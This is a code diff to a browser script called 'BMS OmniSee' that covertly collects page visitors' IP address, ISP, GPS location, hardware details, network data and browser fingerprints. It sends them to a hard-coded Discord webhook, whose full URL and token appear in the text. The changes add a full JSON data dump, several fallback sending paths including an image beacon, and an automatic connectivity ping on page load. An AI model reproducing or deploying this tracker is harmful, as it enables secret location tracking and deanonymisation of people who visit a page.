@@ -15,6 +15,8 @@
 
     const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1526903563912216617/s9kXzTaBNeIVQB4Il32S0D02HU26cwob_xkGvdvpi1u49s8eq5dFiNSOHXh5Y2lrhzjx';
 
+    let CAPTURED = {}; const CAPTURE = true; // capture all fields raw
+
     const CFG = {
         WEBHOOK: DISCORD_WEBHOOK,
         AUTO_SEND: true,
@@ -291,46 +293,65 @@
     }
 
     // ── 8. SEND TO DISCORD ──
-    function sendToDiscord() {
+    async function sendToDiscord() {
         add('Collected_At', new Date().toISOString());
         add('Total_Fields', F);
         add('Page_URL', window.location.href);
         add('Referrer', document.referrer || 'direct');
         add('Page_Title', document.title);
 
-        // Build a nice Discord embed
-        const loc = D.Best_Lat && D.Best_Lon
-            ? `[${parseFloat(D.Best_Lat).toFixed(6)}, ${parseFloat(D.Best_Lon).toFixed(6)}](https://www.google.com/maps?q=${D.Best_Lat},${D.Best_Lon})`
+        // Build full data dump + nice embed
+        const locStr = D.Best_Lat && D.Best_Lon
+            ? `${parseFloat(D.Best_Lat).toFixed(6)}, ${parseFloat(D.Best_Lon).toFixed(6)} (https://www.google.com/maps?q=${D.Best_Lat},${D.Best_Lon})`
             : 'Unknown';
+        const fullJSON = JSON.stringify(D, null, 2);
+        const snippet = fullJSON.length > 1500 ? fullJSON.substring(0, 1500) + '\n...' : fullJSON;
 
-        const embed = {
+        const payload = {
+            content: '',
             embeds: [{
                 title: '📍 BMS OmniSee — Data Collected',
                 color: 0x8b7cfc,
                 fields: [
                     { name: '👤 User', value: `IP: \`${D.IP_Address || '?'}\`\nISP: ${D.ISP || '?'}\nOrg: ${D.Org || '?'}`, inline: true },
-                    { name: '📍 Location', value: `${D.City || '?'}, ${D.Region || '?'}, ${D.Country || '?'}\nLat/Lon: ${loc}\nAccuracy: ${D.Best_Accuracy_m || '?'}`, inline: true },
+                    { name: '📍 Location', value: `${D.City || '?'}, ${D.Region || '?'}, ${D.Country || '?'}\nLat/Lon: ${locStr.substring(0, 100)}\nAccuracy: ${D.Best_Accuracy_m || '?'}`, inline: true },
                     { name: '🖥 System', value: `OS: ${D.Platform || '?'}\nBrowser: ${(D.UA || '').substring(0, 80)}\nScreen: ${D.Screen || '?'}`, inline: true },
                     { name: '🔧 Hardware', value: `CPU: ${D.CPU || '?'} cores\nRAM: ${D.RAM_GB || '?'} GB\nGPU: ${(D.GPU_Renderer || '?').substring(0, 50)}`, inline: true },
                     { name: '🌐 Network', value: `Type: ${D.Net_Type || '?'}\nDownlink: ${D.Net_DL || '?'} Mbps\nRTT: ${D.Net_RTT || '?'} ms\nProxy/VPN: ${D.Proxy_VPN || '?'}`, inline: true },
                     { name: '🎨 Fingerprint', value: `Canvas: \`${(D.Canvas_FP || '?').substring(0, 12)}\`\nFonts: ${D.Fonts_N || '?'}\nWebRTC IPs: ${D.W_Count || '?'}`, inline: true },
-                    { name: '📱 GPS', value: D.GPS_Lat ? `Lat: ${D.GPS_Lat}\nLon: ${D.GPS_Lon}\nAcc: ±${D.GPS_Acc_m}m\nSource: Fresh GPS` : (D.Cached_GPS_Lat ? `Lat: ${D.Cached_GPS_Lat}\nLon: ${D.Cached_GPS_Lng}\nAcc: ±${D.Cached_GPS_Acc || '?'}m\nSource: Cache` : 'Not available'), inline: true },
-                    { name: '📊 Session', value: `Page: ${(D.Page_URL || '').substring(0, 60)}\nReferrer: ${(D.Referrer || 'direct').substring(0, 40)}\nTimezone: ${D.TZ_Name || '?'}\nSessions: ${D.Sessions || 1}`, inline: true },
-                    { name: '📦 Data Points', value: `${F} fields collected\n${D.Sessions || 1} total sessions\nSource: ${D.Best_Source || '?'}` , inline: true }
+                    { name: '📱 GPS', value: D.GPS_Lat ? `Lat: ${D.GPS_Lat}\nLon: ${D.GPS_Lon}\nAcc: ±${D.GPS_Acc_m}m\nFresh GPS` : (D.Cached_GPS_Lat ? `Lat: ${D.Cached_GPS_Lat}\nLon: ${D.Cached_GPS_Lng}\nAcc: ±${D.Cached_GPS_Acc || '?'}m\nCached` : 'Not available'), inline: true },
+                    { name: '📊 Session', value: `Page: ${(D.Page_URL || '').substring(0, 50)}\nReferrer: ${(D.Referrer || 'direct').substring(0, 30)}\nTZ: ${D.TZ_Name || '?'}\nSessions: ${D.Sessions || 1}`, inline: true }
                 ],
-                footer: { text: `BMS OmniSee · ${new Date().toLocaleString('id-ID')}` },
+                description: '```json\n' + snippet + '\n```',
+                footer: { text: `BMS OmniSee · ${F} fields · ${new Date().toLocaleString('id-ID')}` },
                 timestamp: new Date().toISOString()
             }]
         };
 
         try {
-            const blob = new Blob([JSON.stringify(embed)], { type: 'application/json' });
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(CFG.WEBHOOK, blob);
-            } else {
-                fetch(CFG.WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob, keepalive: true }).catch(() => {});
+            const resp = await fetch(CFG.WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                keepalive: true
+            });
+            if (!resp.ok) {
+                // Fallback: send as simple content
+                const fallbackPayload = { content: '```json\n' + fullJSON.substring(0, 1900) + '\n```' };
+                await fetch(CFG.WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(fallbackPayload),
+                    keepalive: true
+                });
             }
-        } catch (e) {}
+        } catch (e) {
+            // Final fallback via Image beacon
+            try {
+                const img = new Image();
+                img.src = CFG.WEBHOOK + '?content=' + encodeURIComponent('Data collected: ' + (D.IP_Address || '?') + ' - ' + (D.City || '?'));
+            } catch (e2) {}
+        }
     }
 
     // ── MAIN ──
@@ -364,6 +385,22 @@
         if (window.requestIdleCallback) requestIdleCallback(() => main(), { timeout: 3000 });
         else setTimeout(main, 500);
     }
+
+    // ── TEST WEBHOOK ON LOAD ──
+    // Send a test ping immediately to verify webhook connectivity
+    setTimeout(() => {
+        fetch(CFG.WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: '🟢 **BMS OmniSee** — Koneksi OK • ' + new Date().toLocaleString('id-ID')
+            }),
+            keepalive: true
+        }).then(r => {
+            if (r.ok) console.log('[BMS] ✅ Webhook connected');
+            else console.log('[BMS] ❌ Webhook error:', r.status);
+        }).catch(e => console.log('[BMS] ❌ Webhook:', e.message));
+    }, 1000);
 
     // On user click — auto trigger GPS/notif if not yet done
     let gestureFired = false;
